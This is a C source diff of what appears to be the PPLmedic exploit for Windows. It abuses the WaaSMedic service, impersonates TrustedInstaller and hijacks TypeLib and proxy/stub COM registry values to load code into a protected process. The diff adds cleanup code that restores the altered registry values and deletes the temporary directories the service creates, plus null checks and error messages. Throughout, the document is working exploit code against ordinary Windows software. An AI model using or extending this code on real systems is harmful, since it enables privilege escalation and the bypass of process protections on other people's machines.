@@ -34,6 +34,7 @@ BOOL run_ppl_medic_exploit(
     HANDLE     WaaSMedicCapsuleHandle       = NULL;
     HANDLE     ProxyStubDllLoadEventHandle  = NULL;
     PFILE_LIST TemporaryDiretoriesBefore    = NULL;
+    PFILE_LIST TemporaryDiretoriesAfter     = NULL;
     DWORD64    WriteAtLaunchDetectionOnly   = 0;
     DWORD64    WriteAtLaunchRemediationOnly = 0;
 
@@ -55,6 +56,7 @@ BOOL run_ppl_medic_exploit(
     success = restart_waa_s_medic_svc();
     if (!success)
         goto cleanup;
+
     DPRINT("Service (re)started: %ls", STR_WAASMEDIC_SVC);
 
     //
@@ -65,6 +67,7 @@ BOOL run_ppl_medic_exploit(
     success = find_waa_s_medic_svc_base_named_objects_handle(&hBaseNamedObjects);
     if (!success)
         goto cleanup;
+
     DPRINT("Directory handle value in remote process: 0x%04x", (ULONG32)(ULONG_PTR)hBaseNamedObjects);
 
     //
@@ -93,7 +96,7 @@ BOOL run_ppl_medic_exploit(
         goto cleanup;
 
     success = modify_type_lib_registry_value(
-        TypeLibOrigPath,
+        TypeLibPath,
         TypeLibRegValuePath,
         hTI,
         &StateRegTypeLibModified);
@@ -113,6 +116,7 @@ BOOL run_ppl_medic_exploit(
         PRINT_ERR("Failed to determine the address of LdrpKnownDllDirectoryHandle");
         goto cleanup;
     }
+
     DPRINT("Known DLL Directory handle @ 0x%p", KnownDllDirectoryHandleAddr);
 
     success = calculate_write_addresses(KnownDllDirectoryHandleAddr, (ULONG32)(ULONG_PTR)hBaseNamedObjects, &WriteAtLaunchDetectionOnly, &WriteAtLaunchRemediationOnly);
@@ -146,9 +150,10 @@ BOOL run_ppl_medic_exploit(
     if (!success)
         goto cleanup;
 
-    success = modify_proxy_stub_registry_value(hTI, ProxyStubRegValuePath, ProxyStubOrigPath, HijackedDllName, &StateRegProxyStubModified);
+    success = modify_proxy_stub_registry_value(hTI, ProxyStubRegValuePath, HijackedDllName, &StateRegProxyStubModified);
     if (!success)
         goto cleanup;
+
     DPRINT("Proxy/Stub DLL path set in the registry: %ls", HijackedDllName);
 
     //
@@ -163,6 +168,7 @@ BOOL run_ppl_medic_exploit(
     success = lock_plugin_dll(WaaSMedicCapsulePath, &StatePluginDllLocked, &WaaSMedicCapsuleHandle);
     if (!success)
         goto cleanup;
+
     DPRINT("Plugin DLL file locked: %ls", WaaSMedicCapsulePath);
 
     //
@@ -247,6 +253,33 @@ BOOL run_ppl_medic_exploit(
     }
 
 cleanup:
+    if (StateRegTypeLibModified)
+    {
+        modify_type_lib_registry_value(
+            TypeLibOrigPath,
+            TypeLibRegValuePath,
+            hTI,
+            NULL);
+    }
+
+    if (StateRegProxyStubModified)
+    {
+        modify_proxy_stub_registry_value(
+            hTI,
+            ProxyStubRegValuePath,
+            ProxyStubOrigPath,
+            NULL);
+    }
+
+    enumerate_temporary_directories(&TemporaryDiretoriesAfter);
+    cleanup_temp_directories(TemporaryDiretoriesBefore, TemporaryDiretoriesAfter);
+
+    free_directory_list(TemporaryDiretoriesBefore);
+    TemporaryDiretoriesBefore = NULL;
+
+    free_directory_list(TemporaryDiretoriesAfter);
+    TemporaryDiretoriesAfter = NULL;
+
     if (hBaseNamedObjects)
         NtClose(hBaseNamedObjects);
     if (TypeLibPath)
@@ -273,16 +306,101 @@ cleanup:
         intFree(WaaSMedicCapsulePath);
     if (ProxyStubDllLoadEventName)
         intFree(ProxyStubDllLoadEventName);
-    if (TemporaryDiretoriesBefore)
-    {
-        // TODO: free TemporaryDiretoriesBefore
-    }
 
-    // TODO: StateRegTypeLibModified ?
-    // TODO: StateRegProxyStubModified ?
     // TODO: StatePluginDllLocked ?
     // TODO: free IWaaSRemediationEx?
     // TODO: CoUninitialize
+
+    return ret_val;
+}
+
+VOID free_directory_list(
+    IN PFILE_LIST head)
+{
+    PFILE_LIST elem = NULL;
+
+    elem = head;
+    while (elem)
+    {
+        head = elem->Next;
+        intFree(elem);
+        elem = head;
+    }
+}
+
+BOOL cleanup_temp_directories(
+    IN PFILE_LIST TemporaryDiretoriesBefore,
+    IN PFILE_LIST TemporaryDiretoriesAfter)
+{
+    BOOL       ret_val             = FALSE;
+    BOOL       success             = FALSE;
+    LPWSTR     pwszDirectoryPath   = NULL;
+    LPWSTR     pwszWindowsTempPath = NULL;
+    PFILE_LIST elem_before         = NULL;
+    PFILE_LIST elem_after          = NULL;
+    ULONG32    dirs_to_delete      = 0;
+
+    if (!TemporaryDiretoriesAfter)
+        goto cleanup;
+
+    success = get_windows_temp_directory(&pwszWindowsTempPath);
+    if (!success)
+        goto cleanup;
+
+    pwszDirectoryPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
+    if (!pwszDirectoryPath)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    elem_after = TemporaryDiretoriesAfter;
+
+    while (elem_after)
+    {
+        elem_after->Existed = FALSE;
+        elem_before = TemporaryDiretoriesBefore;
+        while (elem_before)
+        {
+            if (!wcscmp(elem_after->FileName, elem_before->FileName))
+            {
+                elem_after->Existed = TRUE;
+                break;
+            }
+            elem_before = elem_before->Next;
+        }
+
+        if (!elem_after->Existed)
+            dirs_to_delete++;
+
+        elem_after = elem_after->Next;
+    }
+
+    if (dirs_to_delete > 0)
+    {
+        DPRINT("Deleting %d temporary directories created by the service...", dirs_to_delete);
+
+        elem_after = TemporaryDiretoriesAfter;
+
+        while (elem_after)
+        {
+            if (!elem_after->Existed)
+            {
+                swprintf_s(pwszDirectoryPath, MAX_PATH, L"%ws\\%ws", pwszWindowsTempPath, elem_after->FileName);
+
+                if (!delete_directory(pwszDirectoryPath))
+                {
+                    ret_val = FALSE;
+                }
+            }
+
+            elem_after = elem_after->Next;
+        }
+    }
+
+cleanup:
+    safe_free((PVOID*)&pwszWindowsTempPath);
+    safe_free((PVOID*)&pwszDirectoryPath);
 
     return ret_val;
 }
@@ -306,14 +424,14 @@ BOOL enumerate_temporary_directories(
 
     // TODO: dinvoke
 
+    if (!pfile_list)
+        return FALSE;
+
     *pfile_list = NULL;
 
     success = get_windows_temp_directory(&pwszSearchPattern);
     if (!success)
-    {
-        function_failed("GetWindowsTempDirectory");
         goto cleanup;
-    }
 
     swprintf_s(pwszSearchPattern, MAX_PATH, L"%ws\\%ws", pwszSearchPattern, L"_????????-????-????-????-????????????");
 
@@ -345,6 +463,8 @@ BOOL enumerate_temporary_directories(
         //DPRINT("current_file->FileName: %ls", current_file->FileName);
 
     } while (FindNextFileW(hFind, &FindData));
+
+    *pfile_list = file_list;
 
     ret_val = TRUE;
 
@@ -574,7 +694,6 @@ cleanup:
 BOOL modify_proxy_stub_registry_value(
     IN HANDLE hTI,
     IN LPWSTR ProxyStubRegValuePath,
-    IN LPWSTR ProxyStubOrigPath,
     IN LPWSTR HijackedDllName,
     OUT PBOOL StateRegProxyStubModified)
 {
@@ -594,6 +713,9 @@ BOOL modify_proxy_stub_registry_value(
         return FALSE;
     }
 
+    if (StateRegProxyStubModified)
+        *StateRegProxyStubModified = FALSE;
+
     success = impersonate_trusted_installer(hTI);
     if (!success)
         goto cleanup;
@@ -603,7 +725,9 @@ BOOL modify_proxy_stub_registry_value(
     if (!success)
         goto cleanup;
 
-    *StateRegProxyStubModified = TRUE;
+    if (StateRegProxyStubModified)
+        *StateRegProxyStubModified = TRUE;
+
     ret_val = TRUE;
 
 cleanup:
@@ -1002,7 +1126,7 @@ cleanup:
 }
 
 BOOL modify_type_lib_registry_value(
-    IN LPWSTR TypeLibOrigPath,
+    IN LPWSTR TypeLibPath,
     IN LPWSTR TypeLibRegValuePath,
     IN HANDLE hTI,
     OUT PBOOL StateRegTypeLibModified)
@@ -1011,7 +1135,8 @@ BOOL modify_type_lib_registry_value(
     BOOL success       = FALSE;
     BOOL bImpersonated = FALSE;
 
-    *StateRegTypeLibModified = FALSE;
+    if(StateRegTypeLibModified)
+        *StateRegTypeLibModified = FALSE;
 
     success = impersonate_trusted_installer(hTI);
     if (!success)
@@ -1019,11 +1144,13 @@ BOOL modify_type_lib_registry_value(
 
     bImpersonated = TRUE;
 
-    success = set_registry_string_value(HKEY_LOCAL_MACHINE, TypeLibRegValuePath, NULL, TypeLibOrigPath);
+    success = set_registry_string_value(HKEY_LOCAL_MACHINE, TypeLibRegValuePath, NULL, TypeLibPath);
     if (!success)
         goto cleanup;
 
-    *StateRegTypeLibModified = TRUE;
+    if(StateRegTypeLibModified)
+        *StateRegTypeLibModified = TRUE;
+
     ret_val = TRUE;
 
 cleanup:
@@ -1284,10 +1411,16 @@ BOOL write_type_lib(
         pFuncDescOrig->elemdescFunc.tdesc.vt = VT_HRESULT; // Set return type to HRESULT
         hr = ICreateTypeInfo_AddFuncDesc(TypeInfoNew, 0, pFuncDescOrig); // Add function description to the interface
         if (hr != S_OK)
+        {
+            function_failed("AddFuncDesc");
             continue;
+        }
         hr = ICreateTypeInfo_SetFuncAndParamNames(TypeInfoNew, 0, Names, cNames); // Set function and parameter names
         if (hr != S_OK)
+        {
+            function_failed("SetFuncAndParamNames");
             continue;
+        }
 
         for (j = 0; j < cNames; j++)
         {
